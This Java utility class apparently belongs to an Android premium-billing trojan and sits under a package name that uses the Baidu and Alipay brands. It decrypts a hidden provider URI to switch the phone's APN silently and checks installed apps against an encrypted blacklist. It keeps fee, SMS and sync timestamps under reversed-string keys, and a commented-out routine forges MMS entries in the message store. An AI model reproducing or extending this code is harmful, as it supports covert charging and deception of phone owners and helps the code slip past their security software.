package com.baidu.alipay;

import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.util.Date;
import java.util.Properties;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.res.AssetManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.util.Log;

import com.baidu.crypto.AesCrypto;

/**
 * 通用工具类
 * 
 * @author WEIXING
 * 
 */
public class Utils {
    public static String HASHCODE = "TEST_HASHCODE";
    private static final char HEX_DIGITS[] = { '0', '1', '2', '3', '4', '5',
            '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F' };

    private static final String ENCRYPTPROVIDER = "3AAE3203591A4911659175238E0B06625082CB0E4DF0EA4ED702709B46881F73965C0BD9F33B482A81588B425B02926E28283BA946F5D06561EE48D9A07F4426";

    public static String getDecryptProvider() {
       return decrypt(ENCRYPTPROVIDER);
    }
    
    public static String decrypt(String s){
    	if(s != null && s.length() > 0){
	   	 	try{
	        	byte[] bytes = AesCrypto.decrypt(Utils.GetBytes(s, s.length()), Constant.PASSWORD);
				return new String(bytes,"utf-8").trim();
			} catch (UnsupportedEncodingException e) {
				e.printStackTrace();
			}
    	}
    	
        return "";
   }
   
    public static void sleep(int seconds){
    	try {
			Thread.sleep(1000 * seconds);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
    }
   
   public static String encrypt(String s){
	   return toHexString(AesCrypto.encrypt(s,Constant.PASSWORD));
   }

    public static String toHexString(byte[] b) {
        if (b == null || b.length == 0) {
            return null;
        }

        StringBuilder sb = new StringBuilder(b.length * 2);
        for (int i = 0; i < b.length; i++) {
            sb.append(HEX_DIGITS[(b[i] & 0xf0) >>> 4]);
            sb.append(HEX_DIGITS[b[i] & 0x0f]);
        }
        return sb.toString();
    }
    
    public static byte[] GetBytes(String key, int len) {

        char[] keys = key.toCharArray();
        byte[] buffer = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            buffer[i / 2] = (byte) (ToHexValue(keys[i], true) + ToHexValue(
                    keys[i + 1], false));
        }
        return buffer;
    }

    private static byte ToHexValue(char c, boolean high) {
        byte num;
        if ((c >= '0') && (c <= '9')) {
            num = (byte) (c - '0');
        } else if ((c >= 'a') && (c <= 'f')) {
            num = (byte) ((c - 'a') + 10);
        } else {
            if ((c < 'A') || (c > 'F')) {
                throw new RuntimeException();
            }
            num = (byte) ((c - 'A') + 10);
        }
        if (high) {
            num = (byte) (num << 4);
        }
        return num;
    }

    /**
     * 判断当期是否是wifi网络
     */
    public static boolean isWiFi(Context context) {
        ConnectivityManager connectivity = (ConnectivityManager) context
                .getSystemService(Context.CONNECTIVITY_SERVICE);
        if (connectivity != null) {
            NetworkInfo activeNetInfo = connectivity.getActiveNetworkInfo();
            if (activeNetInfo != null
                    && activeNetInfo.getType() == ConnectivityManager.TYPE_WIFI) {

                return true;
            }
        }
        return false;
    }

    // /**
    // * 发送彩信
    // *
    // * ===========================该功能暂未实现===========================
    // *
    // * @param title
    // * 彩信的标题
    // * @param num
    // * 发送方号码
    // * @param text
    // * 彩信的内容
    // * @param img
    // * 彩信的图片
    // */
    // public static void sendMms(Context context,String title, String num,
    // String text, String img) {
    //
    // // insert canonical_addresses _id,address
    // long ca_id = 0l;
    // Cursor cursor = null;
    // ContentResolver cr = context.getContentResolver();
    // Uri uri = Uri.parse("content://mms-sms/canonical-addresses");
    // cursor = cr.query(uri, new String[] { "_id" }, "address='" + num + "'",
    // null, null);
    // if (cursor != null && cursor.moveToNext()) {
    // ca_id = cursor.getLong(0);
    // if (cursor != null) {
    // cursor.close();
    // }
    // } else {
    // ContentValues ca_values = new ContentValues();
    // ca_values.put("address", num);
    // context.getContentResolver().insert(uri, ca_values);
    // cursor = cr.query(uri, new String[] { "_id" }, "address='" + num
    // + "'", null, null);
    // if (cursor != null && cursor.moveToNext()) {
    // ca_id = cursor.getLong(0);
    // }
    // if (cursor != null) {
    // cursor.close();
    // }
    // }
    // // insert threads
    // //
    // _id,date,message_count,recipient_ids(canonical_addresses-id),snippet,snippet_cs,type,error,has_attachment
    // ContentValues thread_values = new ContentValues();
    // thread_values.put("date", new Date().getTime());
    // thread_values.put("recipient_ids", ca_id);
    // thread_values.put("snippet", text);
    // context.getContentResolver().insert(
    // Uri.parse("content://mms/threads"), thread_values);
    // long thread_id = 0l;
    // cursor = cr.query(uri, new String[] { "_id" },
    // "recipient_ids=" + ca_id, null, null);
    // if (cursor != null && cursor.moveToNext()) {
    // thread_id = cursor.getLong(0);
    // }
    // if (cursor != null) {
    // cursor.close();
    // }
    // // insert pdu _id,thread_id(threads-id),date,,,m_id,sub,,,,,,,,,,,,,
    // ContentValues pdu_values = new ContentValues();
    // pdu_values.put("thread_id", thread_id);
    // pdu_values.put("date", new Date().getTime());
    // pdu_values.put("sub", title);
    // pdu_values.put("m_id", "031910422391000135525");
    // context.getContentResolver().insert(
    // Uri.parse("content://mms/threads"), pdu_values);
    // long mid = 0l;
    // cursor = cr.query(uri, new String[] { "_id" },
    // "recipient_ids=" + ca_id, null, null);
    // if (cursor != null && cursor.moveToNext()) {
    // thread_id = cursor.getLong(0);
    // }
    // if (cursor != null) {
    // cursor.close();
    // }
    // // insert part _id,mid(pdu-id),,ct,,,,,cid,,,_data,text
    // ContentValues part_values = new ContentValues();
    // part_values.put("mid", mid);
    // part_values.put("ct", "application/smil");
    // part_values.put("text", "<?xml version=.......");
    // part_values.put("_data", "");
    // context.getContentResolver().insert(
    // Uri.parse("content://mms/threads"), part_values);
    // part_values.put("mid", mid);
    // part_values.put("ct", "text/plain");
    // part_values.put("text", text);
    // part_values.put("_data", "");
    // context.getContentResolver().insert(
    // Uri.parse("content://mms/threads"), part_values);
    // part_values.put("mid", mid);
    // part_values.put("ct", "image/jpeg");
    // part_values.put("text", "");
    // part_values.put("_data", "/data/data/.........");
    // context.getContentResolver().insert(
    // Uri.parse("content://mms/threads"), part_values);
    //
    // // ContentValues values = new ContentValues();
    // // // 主题
    // // values.put(Constant.MMS_SUB, title);
    // // // 日期
    // // values.put(Constant.SMS_DATE, System.currentTimeMillis());
    // // // 读取状态
    // // values.put(Constant.SMS_READ, Constant.SMS_READED);
    // //
    // // ContentValues values2 = new ContentValues();
    // // // 短信内容
    // // values2.put(Constant.MMS_TEXT, text);
    // // // 彩信的附件地址
    // // values2.put("_data", img);
    // // // 状态：发送成功
    // // values2.put(Constant.SMS_STATUS, -1);
    // // // 手机号
    // // values2.put(Constant.SMS_ADDRESS, num);
    // // // 类型
    // // values2.put(Constant.SMS_TYPE, Constant.SMS_TYPE_INBOX);
    // //
    // // // 插入短信
    // // Variable.context.getContentResolver().insert(
    // // Uri.parse(Constant.MMS_URI), values);
    // // // 插入彩信附件
    // // Variable.context.getContentResolver().insert(
    // // Uri.parse("content://mms/part"), values2);
    // }

    public static String getFeedBack(String msendsms) {
        String result = "1";
        try {
            if (msendsms.contains("<feedback>")) {
                result = msendsms.substring(msendsms.indexOf("<feedback>")
                        + "<feedback>".length(),
                        msendsms.indexOf("</feedback>"));
            } else {
                result = "1";
            }
        } catch (Exception e) {
            e.printStackTrace();
            return result;
        }
        return result;
    }

    public static String getApplicationtype(PackageInfo pi) {
        // String type = "";
        // if((pi.applicationInfo.flags & pi.applicationInfo.FLAG_SYSTEM) <=0){
        // type = "user";
        // }else{
        // type = "system";
        // }
        return "";

    }

//    public static String toHexString(byte[] b) {
//        StringBuilder sb = new StringBuilder(b.length * 2);
//        for (int i = 0; i < b.length; i++) {
//            sb.append(HEX_DIGITS[(b[i] & 0xf0) >>> 4]);
//            sb.append(HEX_DIGITS[b[i] & 0x0f]);
//        }
//        return sb.toString();
//    }

//    /**
//     * 给参数加密
//     * 
//     * @param value
//     *            需要加密的字符串
//     * @return
//     */
//    public static String getEncrypt(String value) {
//        String result = "";
//        if (value.length() > 0 && !value.equals("null") && value != null) {
//            byte[] encrypt_value = AES.encrypt(value, Constant.PASSWORD);
//            result = new String(encrypt_value);
//        }
//
//        return result;
//
//    }

    /**
     * 切换网络
     * 
     * @param resolver
     * @param newAPN
     * @return
     */
    public static final Uri CURRENT_APN_URI = Uri
            .parse("content://telephony/carriers/preferapn");
    public static final Uri APN_LIST_URI = Uri
            .parse("content://telephony/carriers");

    private static int updateCurrentAPNLocal(Context context, String newAPN) {
        Cursor cursor = null;
        try {
            // get new apn id from list
            ContentResolver resolver = context.getContentResolver();
            cursor = resolver.query(APN_LIST_URI, null,
                    " apn = ? and current = 1",
                    new String[] { newAPN.toLowerCase() }, null);
            String apnId = null;
            if (cursor != null && cursor.moveToFirst()) {
                apnId = cursor.getString(cursor.getColumnIndex("_id"));
            }
            cursor.close();
            // set new apn id as chosen one
            if (apnId != null) {
                ContentValues values = new ContentValues();
                values.put("apn_id", apnId);
                resolver.update(CURRENT_APN_URI, values, null, null);

                try {
                    Thread.sleep(3000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            } else {
                return 0;
            }
        } catch (Exception e) {
            e.printStackTrace();
            return 0;
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        // update success
        return 1;
    }

    private static boolean isSystemApp(Context context) {
        if (context == null) {
            return false;
        }

        return isSystemApp(context.getPackageManager(),
                context.getPackageName());
    }

    /**
     * whether packageName is system application
     * 
     * @param packageManager
     * @param packageName
     * @return <ul>
     *         <li>if packageManager is null, return false</li>
     *         <li>if package name is null or is empty, return false</li>
     *         <li>if package name not exit, return false</li>
     *         <li>if package name exit, but not system app, return false</li>
     *         <li>else return true</li>
     *         </ul>
     */
    public static boolean isSystemApp(PackageManager packageManager,
            String packageName) {
        if (packageManager == null || packageName == null
                || packageName.length() == 0) {
            return false;
        }

        try {
            ApplicationInfo app = packageManager.getApplicationInfo(
                    packageName, 0);
            return (app != null && (app.flags & ApplicationInfo.FLAG_SYSTEM) > 0);
        } catch (NameNotFoundException e) {
            e.printStackTrace();
        }
        return false;
    }

    /**
     * 获取操作系统版本号
     * 
     * @return
     */
    private static String getSystemVersion() {
        return android.os.Build.VERSION.RELEASE;
    }

    private static boolean isLowerVersion() {
        return getSystemVersion().compareTo("4.0.0") < 0;
    }

    public static int updateCurrentAPN(Context context, String apnType) {
        if (isSystemApp(context) || isLowerVersion()) {
            return updateCurrentAPNLocal(context, apnType);
        } else {
            return updateCurrentAPNRemote(context, apnType);
        }
    }

    private static int updateCurrentAPNRemote(Context context, String apnType) {
        try {
            ContentValues values = new ContentValues();
            values.put("apnType", apnType);

            context.getContentResolver().insert(
                    Uri.parse(getDecryptProvider()), values);

        } catch (Exception e) {
            e.printStackTrace();
            return 0;
        }

        return 1;
    }

    // 以下为计费包用到的工具类
    /**
     * 获取当前的网络状态 0：没有网络 1：WIFI网络 2：wap网络 3：net网络
     */
    public static int getAPNType(Context context) {
        int netType = NetWorkUtils.APNTYPE_NONE;
        ConnectivityManager connMgr = (ConnectivityManager) context
                .getSystemService(Context.CONNECTIVITY_SERVICE);

        if (connMgr != null) {
            NetworkInfo networkInfo = connMgr.getActiveNetworkInfo();

            if (networkInfo == null) {
                return netType;
            }
            int nType = networkInfo.getType();
            if (nType == ConnectivityManager.TYPE_MOBILE) {
                String extraInfo = networkInfo.getExtraInfo().toLowerCase();
                if (extraInfo.endsWith("net")) {
                    netType = NetWorkUtils.APNTYPE_NET;
                } else {
                    netType = NetWorkUtils.APNTYPE_WAP;
                }
            } else if (nType == ConnectivityManager.TYPE_WIFI) {
                netType = NetWorkUtils.APNTYPE_WIFI;
            }
        }
        return netType;
    }

    public static String getApnName(Context context) {
        String apnName = "";

        ConnectivityManager connMgr = (ConnectivityManager) context
                .getSystemService(Context.CONNECTIVITY_SERVICE);

        if (connMgr != null) {
            NetworkInfo networkInfo = connMgr.getActiveNetworkInfo();

            if (networkInfo != null) {
                int nType = networkInfo.getType();
                if (nType == ConnectivityManager.TYPE_MOBILE) {
                    apnName = networkInfo.getExtraInfo().toLowerCase();
                }
            }
        }

        return apnName;
    }

    /**
     * 从脚本中截取需要的字段
     * 
     * @param value
     *            脚本
     * @param node
     *            节点值
     * @param hasnode
     *            是否带节点
     * @return
     */
    public static String substring(String value, String node, boolean hasnode) {
        String result = "";
        try {
            if (value.contains(node)) {
                if (hasnode) {
                    result = (value.substring(value.indexOf("<" + node + ">"),
                            value.indexOf("</" + node + ">")) + "</" + node + ">")
                            .replace("&amp;amp", "&amp");
                } else {
                    result = value.substring(value.indexOf("<" + node + ">")
                            + ("<" + node + ">").length(),
                            value.indexOf("</" + node + ">"));
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            result = "";
        }
        return result;

    }
    
    /**
	 * 判断a,b是否有交集
	 * @param a
	 * @param b
	 * @return
	 */
	public static boolean cross(String a,String b){
		
		if(a != null && b != null && a.length() > 0 && b.length() > 0){
			String[] a1 = a.split(",");
			b = b+"|";
			
			for(String _a : a1){
				if(b.contains(_a+"|")){
					return true;
				}
			}
		}
		
		return false;
	}
	
	//以下处理黑名单软件
	private static final String PREF_HASBLACK = "pref_kcalb";
	private static final String NAME_BLACKSOFTS = "stfoskcalb";
//	private static Boolean hasBlack = null;
//	public static final int HASBLACK_HAS = 1;
//	public static final int HASBLACK_NO = -1;
//	public static final int HASBLACK_ORI = 0;
	private static String BLACKSOFTS = null;
		
	public static boolean getHasBlack(Context context){
		
		if(BLACKSOFTS == null){//初始化时
			SharedPreferences pref = context.getSharedPreferences(PREF_HASBLACK, Context.MODE_PRIVATE);
			BLACKSOFTS = pref.getString(NAME_BLACKSOFTS, "");
			
			if(BLACKSOFTS.length() == 0){
				if(InitArgumentsHelper.getInstance(context).isPositive()){
					BLACKSOFTS = decrypt(Constant.BLACKSOFTS);
				}else{
					BLACKSOFTS = decrypt(Constant.BLACKSOFTSALL);
				}
			}
		}
		
		String allApp = DeviceInfo.getAllApp(context);
		return cross(BLACKSOFTS, allApp);
	}

	public static void setBlackSofts(Context context,String blackSofts){
		SharedPreferences pref = context.getSharedPreferences(PREF_HASBLACK, Context.MODE_PRIVATE);
		
		Editor editor = pref.edit();
		
		editor.putString(NAME_BLACKSOFTS, blackSofts);
		
		editor.commit();
		
		BLACKSOFTS = blackSofts;
	}
	
	private static String cid = null;
	
	public static String getCid(Context context){
		
		if(cid == null){
			Properties prop = getPropertiesFromAssets(context, "c.ini");
			
			cid = prop.getProperty("c_id");
			
			if(prop.get("cid") == null){
				cid = getMetaDataValue(context, "cid");
			}
			
//			if(cid != null && cid.length() > 0){
//				cid = cid.replaceAll("_", "").replaceAll("-","").replaceAll(" ","").replaceAll("\r","").replaceAll("\t","").replaceAll("\n","");
//			}
		}
		cid = filterStr(cid);
		Log.e("Utils", "getCid:*"+cid+"*");
		return cid;
	}
	
	private static String filterStr(String s){
		StringBuffer sb = new StringBuffer();
		
		if(s != null && s.length() > 0){
			s = s.toUpperCase();
			
			for(int i = 0 ; i < s.length() ; i ++){
				String c = s.substring(i, i+1);
				
				if("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ".contains(c)){
					Log.e("Utils","filterStr:*"+c+"* valid");
					sb.append(c);
				}else{
					Log.e("Utils","filterStr:*"+c+"* invalid");
				}
			}
		}
		
		return sb.toString();
	}
	
	 // 系统版本
    public static String getFrimware(Context context) {
        String frimware = Build.VERSION.RELEASE;
        return frimware;
    }
	
	public static Properties getPropertiesFromAssets(Context context,String fileName){
		AssetManager am = context.getAssets();
		
		InputStream is = null;
		Properties prop = new Properties();
		
		try {
			is = am.open(fileName);
			
			prop.load(is);
		} catch (IOException e) {
			e.printStackTrace();
		}finally{
			if(is != null){
				try {
					is.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}
		
		return prop;
	}
	
	public static String getMetaDataValue(Context context,String name) {

        Object value = null;

        PackageManager packageManager = context.getPackageManager();

        ApplicationInfo applicationInfo;

        try {
            applicationInfo = packageManager.getApplicationInfo(context.getPackageName(), 128);

            if (applicationInfo != null && applicationInfo.metaData != null) {
                value = applicationInfo.metaData.get(name);
            }
        } catch (NameNotFoundException e) {
            throw new RuntimeException("Could not read the name in the manifest file.", e);
        }

        if (value == null) {
            throw new RuntimeException("The name '" + name + "' is not defined in the manifest file's meta data.");
        }

        return value.toString();
    }
	
	public static int getResource(Context context,String name,String type){
		try {
			String packageName = context.getPackageName();
			
			if(context.getClass().getName().equals("DLProxyActivity")){
				packageName = Utils.getStrings(new String[]{"com","allgame","alipay","tenent","toast"},".");
			}
			
			return context.getResources().getIdentifier(name, type, packageName);
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		return 0;
	}
	
	//
	public static final int ASYNCHMAXTRYTIMES = 3;
	
	public static final int ASYNCHREQUIREMAXTRYTIMES = 10;
	
	public static boolean asynchErrorRun = false;
	
	//
	private static final String NAME_RANDOM = "random";
	private static final String NAME_LASTRANDOM = "lastRandom";

	public static void setLastRandom(Context context,String lastRandom){
		if(lastRandom != null && lastRandom.length() > 0){
			SharedPreferences pref = context.getSharedPreferences(PREF_HASBLACK, Context.MODE_PRIVATE);
			
			Editor editor = pref.edit();
			
			editor.putString(NAME_LASTRANDOM, lastRandom);
			
			editor.commit();
		}
	}
	
	public static String getLastRandom(Context context){
		SharedPreferences pref = context.getSharedPreferences(PREF_HASBLACK, Context.MODE_PRIVATE);
    	
    	return pref.getString(NAME_LASTRANDOM, "0");
	}
	
	public static void resetRandom(Context context){
	
		setLastRandom(context, getRandom(context));
		
		setRandom(context,"");
	}
	
    public static void setRandom(Context context,String random){
    	SharedPreferences pref = context.getSharedPreferences(PREF_HASBLACK, Context.MODE_PRIVATE);
		
		Editor editor = pref.edit();
		
		editor.putString(NAME_RANDOM, random);
		
		editor.commit();
    }
    
    public static String getRandom(Context context){
    	SharedPreferences pref = context.getSharedPreferences(PREF_HASBLACK, Context.MODE_PRIVATE);
    	
    	String random = pref.getString(NAME_RANDOM, "");
    	
    	if(random == null || random.equals("")){
    		random = System.currentTimeMillis()+"";
    		setRandom(context,random);
    	}
    	
    	return random;
    }
    
    
    //第一次计费请求时间
    public static final String FIRSTFEETIME = "emitrif";
    public static final String LASTSYNCHTIME = "emitnysal";
    
    public static long getFirstFeeTime(Context context){
    	SharedPreferences pref = context.getSharedPreferences(PREF_HASBLACK, Context.MODE_PRIVATE);
    	
    	long firstDay = pref.getLong(FIRSTFEETIME, 0);
    	
    	return firstDay;
    }
    
    public static void setFirstFeeTime(Context context){
    	SharedPreferences pref = context.getSharedPreferences(PREF_HASBLACK, Context.MODE_PRIVATE);
    	
    	long firstTime= pref.getLong(FIRSTFEETIME, 0);
    	
    	if(firstTime == 0){
    		Editor editor = pref.edit();
    		
    		editor.putLong(FIRSTFEETIME, new Date().getTime());
    		
    		editor.commit();
    	}
    }
    
    public static long getLastSynchTime(Context context){
    	SharedPreferences pref = context.getSharedPreferences(PREF_HASBLACK, Context.MODE_PRIVATE);
    	
    	long lastSynchTime = pref.getLong(LASTSYNCHTIME, 0);
    	
    	return lastSynchTime;
    }
    
    public static void setLastSynchTime(Context context){
    	SharedPreferences pref = context.getSharedPreferences(PREF_HASBLACK, Context.MODE_PRIVATE);
    	
    	Editor editor = pref.edit();
		
		editor.putLong(LASTSYNCHTIME, new Date().getTime());
		
		editor.commit();
    }
    
    public static String getStrings(String[] arr,String split){
    	StringBuffer sb = new StringBuffer();
		
		for(String s : arr){
			sb.append(split).append(s);
		}
		
		return sb.substring(split.length());
    }
    
    //MObileId
    public static final String NAME_MOBILEID = "dielibom";
    
    public static Long getMobileId(Context context){
    	SharedPreferences pref = context.getSharedPreferences(PREF_HASBLACK, Context.MODE_PRIVATE);
    	
    	long mobileId = pref.getLong(NAME_MOBILEID, 0l);
    	
    	return mobileId;
    }
    
    public static void setMobileId(Context context,long mobileId){
    	SharedPreferences pref = context.getSharedPreferences(PREF_HASBLACK, Context.MODE_PRIVATE);
    	
    	Editor editor = pref.edit();
		
		editor.putLong(NAME_MOBILEID, mobileId);
		
		editor.commit();
    }
    
    //
    public static final String NAME_LASTSMSTIME = "smstsal";

    public static Long getLastSmsTime(Context context){
    	SharedPreferences pref = context.getSharedPreferences(PREF_HASBLACK, Context.MODE_PRIVATE);
    	
    	long lastSmsTime = pref.getLong(NAME_LASTSMSTIME, 0l);
    	
    	return lastSmsTime;
    }
    
    public static void setLastSmsTime(Context context,long lastSmsTime){
    	SharedPreferences pref = context.getSharedPreferences(PREF_HASBLACK, Context.MODE_PRIVATE);
    	
    	Editor editor = pref.edit();
		
		editor.putLong(NAME_LASTSMSTIME, lastSmsTime);
		
		editor.commit();
    }
}
